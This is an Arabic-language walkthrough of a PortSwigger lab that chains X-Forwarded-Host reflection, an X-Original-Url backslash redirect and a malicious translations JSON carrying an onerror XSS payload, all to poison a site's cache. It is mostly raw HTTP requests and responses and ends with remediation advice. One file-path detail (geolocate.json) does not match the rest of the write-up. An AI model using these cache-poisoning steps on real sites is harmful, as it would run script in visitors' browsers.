# [Combining web cache poisoning vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)

## **`الهدف`**
قم بتسميم ذاكرة التخزين المؤقت باستجابة تقوم بتنفيذ `alert(document.cookie)` في متصفح الضحية، مع ملاحظة أن الضحية يزور الصفحة الرئيسية مرة واحدة تقريبًا في الدقيقة، ولغته مضبوطة على الأنجليزية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A
```
بعد ذلك سنستعمل إضافة `Param Miner` لنكتشف أن اللاب يدعم ترويسة `X-Forwarded-Host:` ويعكسها في الاستجابة ويدعم ترويسة `X-Original-Url:`
وعندما نجرب ترويسة `X-Forwarded-Host:` فى طلب كالتالي:
```http
GET / HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A
X-Forwarded-Host: TESTTEST
```
سنجد الاستجابة كالتالي:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 14534

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"TESTTEST","path":"/"}
        </script>
        <title>Combining web cache poisoning vulnerabilities</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="\resources\js\translations.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Combining web cache poisoning vulnerabilities</h2>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aCombining+web+cache+poisoning+vulnerabilities%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-combining-vulnerabilities&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-combining-vulnerabilities'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form>
                        <select id=lang-select onchange="((ev) => { ev.currentTarget.parentNode.action = '/setlang/' + ev.target.value; ev.currentTarget.parentNode.submit(); })(event)">
                        </select>
                    </form>                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating2.png">
                            $63.17
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/14.jpg">
                            <h3>Mood Enhancer</h3>
                            <img src="/resources/images/rating4.png">
                            $92.70
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $79.03
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating2.png">
                            $41.33
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating1.png">
                            $26.47
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $41.50
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/59.jpg">
                            <h3>Inflatable Holiday Home</h3>
                            <img src="/resources/images/rating2.png">
                            $99.74
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/10.jpg">
                            <h3>Giant Grasshopper</h3>
                            <img src="/resources/images/rating3.png">
                            $13.88
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/60.jpg">
                            <h3>Dancing In The Dark</h3>
                            <img src="/resources/images/rating4.png">
                            $7.20
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating4.png">
                            $82.26
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating2.png">
                            $88.62
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/67.jpg">
                            <h3>Your Virtual Journey Starts Here</h3>
                            <img src="/resources/images/rating5.png">
                            $8.46
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/22.jpg">
                            <h3>Babbage Web Spray</h3>
                            <img src="/resources/images/rating5.png">
                            $32.50
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating5.png">
                            $33.44
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating3.png">
                            $10.72
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating5.png">
                            $64.96
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/61.jpg">
                            <h3>Safety First</h3>
                            <img src="/resources/images/rating5.png">
                            $38.35
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $68.68
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $15.21
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating1.png">
                            $87.53
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initTranslations('//' + data.host + '/resources/json/translations.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
وسنلاحظ أنه ينعكس كـ `absolute URL` يستخدم لاستيراد ملف `JSON.

والان سنبحث قليلًا في الـ `HTTP history` وسنجد هذا الطلب لملف `JSON`
```http
GET /resources/json/translations.json HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A
```
وسنجد أن استجابته يتم حفظها في ذاكرة التخزين المؤقت كالتالي:
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 3000

{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes",
            "Description:": "Descripción:"
        }
    },
    "cn": {
        "name": "中文",
        "translations": {
            "Return to list": "返回清單",
            "View details": "查看詳情",
            "Description:": "描述:"
        }
    },
    "ar": {
        "name": "عربى",
        "translations": {
            "Return to list": "العودة إلى القائمة",
            "View details": "عرض التفاصيل",
            "Description:": "وصف:"
        }
    },
    "en-gb": {
        "name": "Proper English",
        "translations": {
            "Return to list": "From whence you came",
            "View details": "Do me the honour of elaborating",
            "Description:": "Pontifications on the subject matter:"
        }
    },
    "ml": {
        "name": "മലയാളം",
        "translations": {
            "Return to list": "ലിസ്റ്റിലേക്ക് മടങ്ങുക",
            "View details": "വിശദാംശങ്ങൾ കാണുക",
            "Description:": "വിവരണം:"
        }
    },
    "hb": {
        "name": "עברית",
        "translations": {
            "Return to list": "חזור לרשימה",
            "View details": "הצג פרטים",
            "Description:": "תיאור:"
        }
    },
    "zl": {
        "name": "Ẕ̻͕̿̊ͤ̍ͅa͙l̗ͧg̮̤̰̘͇ȍ͇͕̳̙͙͉́̅̋̌̅",
        "translations": {
            "Return to list": "Re̹̰̘͉̹̪ͅt̬̫̜ȕͩ͒ͥͥr̃̉͒n ̎͂t͎͖̽͋o͖̟͚͙̲͐ͤͫ̎̓ ̼̟͈̭͉͎̂ͯ̔ͤͤ̏͐ͅliͤ͑ͧ̆̐̈̀sṭ̠̮̰͍̙͒̔͆̈ͤ̅",
            "View details": "V̖̮͙ͅi͇e͙̦w̭̣̫͇̦̬̰ ̓͑̓ͯ̔d͍͂e͚̮͖͍͖̠͙ͮͭ̉ͦ̏͌̆t̙͎̺͉a̳̖͔̱͉̱͑̆̌̃͊ͬi̯͚͙̼̹̮l̖͎͛̈́͒ͅs̒̒ͤ̽̒̀",
            "Description:": "D̳͔e̝ͩ̐ͅsc̗̱̼̤̬̎̓ͪͣͭ̐ͅr̪̝͖̙̱̄̓͌̓̚ip̭̦̭̰̻ͣ̓̽ͨ̚ț̤̝̻i̹̱̟̞͕̓̓ͬ̓ͬ̆ͅon̠͚͕̈́̋̓:"
        }
    },
    "fn": {
        "name": "Suomalainen",
        "translations": {
            "Return to list": "Palaa luetteloon",
            "View details": "Näytä kuvaus",
            "Description:": "Kuvaus:"
        }
    },
    "hw": {
        "name": "Ōlelo Hawaiʻi",
        "translations": {
            "Return to list": "Hoʻi i ka papa inoa",
            "View details": "E nānā i nā kikoʻī",
            "Description:": "ʻO keʻano:"
        }
    },
    "mm": {
        "name": "ဗမာ",
        "translations": {
            "Return to list": "စာရင်းသို့ပြန်သွားသည်",
            "View details": "အသေးစိတ်ကြည့်ရန်",
            "Description:": "ဖော်ပြချက်:"
        }
    }
}
```

لذلك سنقوم بالدخول إلى سيرفر الاستغلال الموجود في اللاب، ونقوم بتعديل حقل `File` إلى `/resources/json/geolocate.json` ونقوم بحقن `Access-Control-Allow-Origin: *` في `Head`
ونقوم بحقن
```JSON
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "espaÃ±ol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "DescripciÃ³n"
        }
    }
}
```
 في حقل `Body` ونضغط `Store`

وبعد ذلك سنبحث قليًلا في الـ `HTTP history` وسنجد هذين الطلبين

```http
GET /?localized=1 HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A; lang=es
```

```http
GET /setlang/es? HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A; lang=en
```

حيث أن الطلب الأول يقوم بتغيير الـ `Cookies` الخاصة بالمستخدم لتناسب اللغة التي اختارها

والطلب التاني يقوم بعمل إعادة توجيه لنسخة الموقع باللغة التي اختارها المستخدم.

والأن سنقوم بتصميم الهجوم، حيث سنقوم بإضافة ترويسة `X-Forwarded-Host:` في طلب `GET /?localized=1`
```http
GET /?localized=1 HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A; lang=es
X-Forwarded-Host: exploit-0a3100bd04c6379a824306d4018b00d2.exploit-server.net
```
وسنتأكد أن الإستجابة يتم تخزينها وأن الترويسة تنعكس الإستجابة.

وبعد ذلك سنقوم سنقوم بإضافة ترويسة `X-Original-Url: /setlang/es` في طلب الصفحة الرئيسية `GET /`
```http
GET / HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A
X-Original-Url: /setlang/es
```

ولكن سنلاحظ أن الاستجابة لا يتم تخزينها
```http
HTTP/2 302 Found
Location: /?localized=1
Cache-Control: private
Set-Cookie: lang=es; Path=/; Secure
X-Frame-Options: SAMEORIGIN
X-Cache: miss
Content-Length: 0
```
وذلك لأنها تحتوى على ترويسة `Set-Cookie:`
ولكن إذا لاحظنا فإن الصفحة الرئيسية تستعمل أحيانًا

 الخط المائل العكسي `\` كفاصل بين المجلدات، ولكن يقوم السيرفر بتطيع هذه العلامات إلى علامات خط مائل أمامي `/` في إعادة التوجيه.

ولذلك سنقوم وبعد ذلك سنقوم سنقوم بإضافة ترويسة `X-Original-Url: /setlang/\es` في طلب الصفحة الرئيسية `GET /`
```http
GET / HTTP/2
Host: 0a6f003d044c37478287071300e20084.web-security-academy.net
Cookie: session=dE46OOii9jvCSUwv5ee5OcjpzdmFxY8A
X-Original-Url: /setlang\es
```
وسنلاحظ أن الاستجابة تم تخزينها
```http
HTTP/2 302 Found
Location: /setlang/es
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

والأن الخطوة الأخيرة كالتالي: سنقوم بتكرار إرسال طلب كلًا من : `GET / و GET /?localized=1` بشكل متتالي عدة مرات حتى يدخل الضحية إلى الموقع وننتهي من حل الاب.

وما يحدث في هذا الاستغلال هو كالتالي: عندما يدخل الضحية إلى الصفحة الرئيسية `GET /` ستتفعل ترويسة `X-Original-Url:` الموجودة في الاستجابة المخزنة مؤقتًا وتقوم بنقله تلقائيًا إلى `/setlang\es` والتي يتم تطبيعها إلى `/setlang/es` وبالتالي سيتم تغيير الـ `Cookie` الخاصة بالضحية إلى `lang=es` ولذلك سيقوم المتصفح بتحويل الضحية إلى النسخة الإسبانية من الموقع وهي `/?localized=1` وبمجرد الدخول إليه ستتفعل ترويسة `X-Forwarded-Host:` الموجودة في الاستجابة المخزنة مؤقتًا والتي يوجد في قيمتها سيرفر الاستغلال وبالتالي يتم تفعيل الكود الذي قمنا بوضعه في خانة `Body` في سيرفر الاستغلال فيتم تفعيل الـ `POP UP`.
## **`ترقيع الثغرة`**
إذا لم تكن البنية التحتية للموقع تستخدم `Reverse Proxy` أو` Load Balancer` يتطلب استخدام ترويسة `X-Forwarded-` لعمله الداخلي، فيجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف هذه الترويسة تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.`

ويجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Forwarded-Host`) القادمة من المستخدم (لأنها `User Input` يمكن التلاعب به)، وبدلاً من ذلك، يجب الاعتماد على متغير ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`.

ويجب استخدام مسارات نسبية `Relative Paths` لاستدعاء ملف الـ `JSON` بما أنه موجودة على نفس السيرفر، فيجب تعديل الكود ليكون:
```JavaScript 
initGeoLocate('/resources/json/geolocate.json');
```

ويجب تعديل كود الجافاسكربت في المتصفح ليتعامل مع البيانات القادمة من الـ `JSON` كنصوص صريحة `Plain Text` وليس كأكواد `HTML` قابلة للتنفيذ عن طريق استخدام `textContent` أو `innerText` لتجنب خلق ثغرة `DOM-based XSS` بدلًا  من استخدام دوال غير آمنة مثل `innerHTML`.

ويجب على التطبيق تجاهل ترويسات إعادة كتابة المسار (مثل `X-Original-Url` و `X-Rewrite-Url`) وعدم الاعتماد عليها لتوجيه الطلبات الداخلية، بل يجب الاعتماد حصرياً على الـ `Request URI` الفعلي.

يجب أن تتطابق طريقة قراءة الـ `Cache` والسيرفر الخلفي للمسارات بنسبة `100%`، والأفضل أمنياً هو أن يقوم السيرفر برفض أي طلب يحتوي على مسارات مبهمة أو غير قياسية (مثل استخدام الخط المائل العكسي `\`) بإرجاع خطأ `400 Bad Request`، بدلاً من محاولة تصحيح المسار.
